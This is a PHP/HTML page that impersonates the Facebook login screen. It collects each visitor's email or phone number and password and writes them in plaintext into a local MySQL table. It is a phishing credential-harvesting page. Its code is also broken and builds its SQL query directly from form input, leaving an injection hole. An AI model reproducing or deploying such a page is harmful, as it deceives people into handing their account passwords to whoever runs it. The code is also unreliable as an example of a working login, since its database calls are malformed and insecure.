<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
create acct 
    <div class="h1">
        <h1 class="h">facebook</h1>
        <p class="pr">timmie helps you connect and share with the people in your life.</p>
    </div>
    <form class="main" action="" method="POST" >
        <input type="text" placeholder="Email address or phone number" name="email" class="txt"><br>
        <input type="password" placeholder="Password" name="password" class="txt"><br>
               <input type="submit" name="submit" value="Submit" class="login-btn" href="#"><br>
        <div class="a-link">
            <a href="" class="link" target="_blank">Forgotten Password?</a>
        </div>
        <div class="ca" action="" method="post">
            <a href="" action="" method="post" class="pca">Create New Account</a>
     
        </div>
    </form>

   <?php
    
    $con = mysqli_connect("localhost","root","","ymaillog");
    if(isset($_POST['submit']))
    {

        $email=$_POST['email'];
        $password=$_POST['password'];


        
            $query = "insert into ymailinfo(email,password) values('$email', '$password')" ;
        $result=mysqli_query($query,"INSERT Into ymailinfo(email,pass) values("ss",'$email','$password')");
        if($result)
        {
            echo "successfully";
        }
        else{
            echo 'failed';
        }

    }


?>
</body>

</html>